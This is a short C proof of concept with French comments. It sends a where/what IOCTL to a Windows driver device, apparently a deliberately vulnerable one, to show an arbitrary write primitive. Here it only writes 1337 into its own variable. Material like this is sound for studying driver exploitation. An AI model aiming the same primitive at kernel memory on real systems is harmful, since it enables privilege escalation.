/*
    @0vercl0k - Feel my l33tness - 0vercl0k.tuxfamily.org :)
*/

#include <windows.h>
#include <winioctl.h>

#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\3"

typedef struct
{
    DWORD* where;
    DWORD what;
} L33TNESS,
*PL33TNESS;

int main()
{
    HANDLE hDevice = NULL;
    L33TNESS l33t = {0};
    DWORD byte = 0, am_i_leet = 0;

    printf("Am I l33t ? %.3d %% !", am_i_leet);

    /* On recupère un handle sur le driver */
    hDevice = CreateFile(
        DEVICE_NAME,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    l33t.where = &am_i_leet;
    l33t.what = 1337;

    /* On envoit la sauce ! */
    DeviceIoControl(
        hDevice,
        IOCTL_WRIT,
        &l33t,
        sizeof(l33t),
        NULL,
        0,
        &byte,
        NULL
    );

    CloseHandle(hDevice);

    printf("And now, AM I L33T MOTHAFOKA ? %.3d %%\n", am_i_leet);
    return EXIT_SUCCESS;
}
